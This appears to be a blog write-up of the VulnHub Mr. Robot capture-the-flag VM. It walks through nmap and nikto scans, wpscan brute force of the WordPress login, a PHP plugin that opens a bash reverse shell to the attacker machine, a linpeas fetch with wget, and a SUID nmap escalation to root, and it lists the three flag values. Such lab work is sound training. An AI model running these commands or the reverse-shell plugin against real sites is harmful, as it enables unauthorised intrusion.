---
layout: default
---

# VulnHub - Mr. Robot writeup 

![Header image](/assets/images/vh_mr_robot/mr_robot_header.png)

[VulnHub image link](https://www.vulnhub.com/entry/mr-robot-1,151/)

:robot: :computer:

## Introduction 

Hello Friend.

Welcome to a write-up about hacking into the Mr. Robot themed vulnhub virtual machine (VM) image.

_Authors Notes_
> Based on the show, Mr. Robot. 
> This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. 
> The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

![Mr Robot web site](/assets/images/vh_mr_robot/mr_robot_intro.gif)

## Initial recon

__Target IP address: 192.168.56.134__

### Nmap scan

Lets start our recon with a nmap TCP SYN fast (-T4) aggressive (-A) profile scan and set the output to be very verbose (-vv) and scan all ports (-p-) and output to all nmap formats (-oA) with the output filename of tcp_agg_all.
```
sudo nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.134
```

You can conduct a default UDP version scan of the top 1000 UDP ports if you wish with the command below.
```
sudo nmap -sUVC -vv -p- -oA upd_top_1000 192.168.56.134
```

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Thu Aug 27 12:18:11 2020 as: nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.134
Nmap scan report for 192.168.56.134
Host is up, received arp-response (0.00048s latency).
Scanned at 2020-08-27 12:18:12 EDT for 105s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b

MAC Address: 08:00:27:EF:CF:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/27%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5F
...

Uptime guess: 198.048 days (since Tue Feb 11 10:10:50 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.56.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 27 12:19:57 2020 -- 1 IP address (1 host up) scanned in 107.57 seconds
```

## Enumeration

There are only two ports open on this machine ports 80 HTTP and 443 HTTPS running on an Apache web server.

Run a nikto scan against the web server to discover any default configurations, directories and files and then output the results to a nikto_scan.txt file for later analyses if you wish.
```
nikto -h 192.168.56.134 | tee nikto_scan.txt
```

The nikto scan reveals a few import pieces of information. The web server is running a wordpress application as it contains a lot of the common wordpress pages.
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.134
+ Target Hostname:    192.168.56.134
+ Target Port:        80
+ Start Time:         2020-08-28 13:55:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://192.168.56.134/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-08-28 14:02:47 (GMT-4) (425 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Checking out the main website we are greeted by what looks to be like a terminal running in the web browser. However upon further inspection of the web pages source code we find that its all just a javascript program.

Doing a bit of further manual enumeration its always good practice to check the `robots.txt` file. We find two interesting entries to an `fsocity.dic` file and the first flag/key `key-1-of-3.txt` file.
> 073403c8a58a1f80d943455fb30724b9

![Website Enumeration](/assets/images/vh_mr_robot/mr_robot_web_1.jpg)

> The robots exclusion standard, also known as the robots exclusion protocol or simply robots.txt, is a standard used by websites to communicate with web crawlers and other web robots. The standard specifies how to inform the web robot about which areas of the website should not be processed or scanned. 

[Source](https://en.wikipedia.org/wiki/Robots_exclusion_standard)


The `fsocity.dic` file contains 858160 lines of random words and numbers. We could potentially use this files contents as passwords in a brute force attack against the wordpress login.

We can shorten our attack time be sorting the contents within the file and just grabbing unique entries with the command below.
```
# You can check the number of lines in a file with wc
wc -l fsocity.dic

# Sort the file and filter out unique occurrences
sort -u fsocity.dic >> fsocity.dic.sorted
```

If you check the number of lines now for the sorted file we have 11451 lines down from 858160 which is way smaller and will increase the efficiency of our brute force attack.

We need to find a valid username for wordpress before we proceed with the brute force attack.

Lets use wpscan to further enumerate the wordpress site to help us try find a username and also scan for any vulnerable wordpress plugins.

Enumerate (-e) usernames (u) using wpscan to spider the site in search for usernames.
```
sudo wpscan --url 192.168.56.134 -e u
```

Enumerate all plugins (ap) using the wpscan aggressive plugin detection. You need to register with your own [WPVulnDB API token](https://wpvulndb.com/api).

> The WPScan CLI tool uses the WPVulnDB API to retrieve WordPress vulnerability data in real time. For WPScan to retrieve the vulnerability data an API token must be supplied via the --api-token option, or via a configuration file, as discussed below. An API token can be obtained by registering an account on WPVulnDB. Up to 50 API requests per day are given free of charge to registered users. 

```
sudo wpscan --url 192.168.56.134 -e ap --plugins-detection aggressive --api-token your_api_token
```

The user enumeration scan did not pick up anything this time. We can however utilize the wp-login.php pages error messages to help use enumerate a correct username.
Notice the different Error messages in the screenshot below. It helps us to deduce the `elliot` is a correct username. 

If you wondering how we found elliot it was an educated guess and involves a bit of open-source intelligence (OSNIT) gathering using google to ask who is Mr. Robot? If you are a fan of the show you will know that Mr. Robot is a construct within Elliot Alderson's mind.

![Wordpress user enumeration](/assets/images/vh_mr_robot/mr_robot_wordpress_user_enum_1.jpg)

Now that we have found a valid username and have a relatively small wordlist we can brute force the wordpress login. Specifying 50 threads to speed up the process.
```
sudo wpscan --url 192.168.56.134 --usernames elliot --passwords fsocity.dic.sorted --max-threads 50
```

Once we have access to the wordpress backend we can abuse the Plugins functionality to upload a simple php/bash reverse shell plugin.

Insert the following reverse shell plugin code into a file, change the IP address to your attacking machine and then zip the file.
```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Wordpress Reverse Shell Plugin
* Version: 1.0
* Author: Zero
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/1337 0>&1'");
?>
```

![Wordpress Plugin Upload](/assets/images/vh_mr_robot/mr_robot_wordpress_rev_shell_upload_1.jpg)

Open a netcat listener on port 1337 and then click on *Activate Plugin* to receive the reverse shell.
```
sudo nc -nvlp 1337
```

![Wordpress Reverse Shell](/assets/images/vh_mr_robot/mr_robot_rev_shell_upload.jpg)

Now that we have a shell on the system lets see if we can elevate our privileges to get root access. 

## Privilege Escalation

We obtained initial access as the `daemon` user. Lets navigate to the /home directory and see what user files we can find there. There is a robot user folder so we check inside to see what we can find there. There are 2 files of interest but we can only read the one named `password.raw-md` that seems to contain a username and what looks like an md5 hash.

We can crack the md5 hash using a free online hash cracker site like [crackstation.net](https://crackstation.net/)

![Cracking MD5 Hash](/assets/images/vh_mr_robot/mr_robot_priv_esc_robot.jpg)

Once we have cracked the MD5 hash we can try to change user to `robot` using the cracked password of `abcdefghijklmnopqrstuvwxyz`

```bash
su robot
```

We now have the permissions to read the 2nd flag/key located in the /home/robot/ directory.

```
cat /home/robot/key-2-of-3.txt
```

> 822c73956184f694993bede3eb39f959

Now lets see if we can get the root access. Lets download the Linux local Privilege Escalation Awesome Script onto the machine and use that to find privilege escalation vectors.

[LinPEAS github repo](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Host the file on your attacking machine using a simple python http server and serve it to the victim via http and download with wget.
```bash
# Start python web server where your linpeas.sh script is located.
sudo python3 -m http.server 80

# On the victim machine download the file using wget from your attacking machines IP address
wget 192.168.56.102/linpeas.sh

# Change the permissions on the file to be able to execute it.
chmod +x linpeas.sh

# Now execute the script with all tests (-a) and output to a file for later analyses if need be
./linpeas.sh -a | tee linpeas_robot.txt
```

![Linpeas Script](/assets/images/vh_mr_robot/mr_robot_priv_esc_linpeas_1.jpg)

The linpeas script highlights that the systems kernel version is a 99% Privilege Escalation vector
> Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10

It also highlights that nmap binary has its SUID bit set, this is another possible privilege escalation vector that is less intrusive than a kernel exploit which poses a risk of crashing the system! So we will try exploit this SUID bit to gain root access.

![Linpeas SUID](/assets/images/vh_mr_robot/mr_robot_priv_esc_linpeas_2.jpg)

The following find command will find all files that have the SUID bit set.
```
find / -user root -perm -4000 -print 2>/dev/null
```

Nmap has the ability to spawn an interactive shell so lets try that to get root access.

* Tip - [GTFOBins](http://gtfobins.github.io/gtfobins/nmap/) is a great resource of a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

Execute the following commands to get root access!
```
nmap --interactive

# Once within nmap execute sh
!sh

# Check your permissions with the id command
id
```

You will notice that the effective user id is set to root: `euid=0(root)`

![Root Access via SUID](/assets/images/vh_mr_robot/mr_robot_priv_esc_root.jpg)

```
cat /root/key-3-of-3.txt
```

> 04787ddef27c3dee1ee161b21670b4e4

We have gained root access and obtained the last flag/key thus completing the hack on this box!

## Summary

This was a fun and easy box that involved a bit of enumeration to find the pieces of information needed to gain access and then escalate our privileges from daemon to robot to root.
We could have simply used a kernel exploit to jump from daemon to root but kernel exploits are considered inherently risky and should be considered as a last resort.

If you have not watched the show Mr Robot, I highly recommend it as it displays the most accurate depiction of hacking and the ideas explored in the show are revolutionary!

Thanks for reading this write-up and hopefully you learned something.

Goodbye friend.

## References

[Mr Robot Wikipedia Page](https://en.wikipedia.org/wiki/Mr._Robot)

![fsociety](/assets/images/vh_mr_robot/fsociety.png)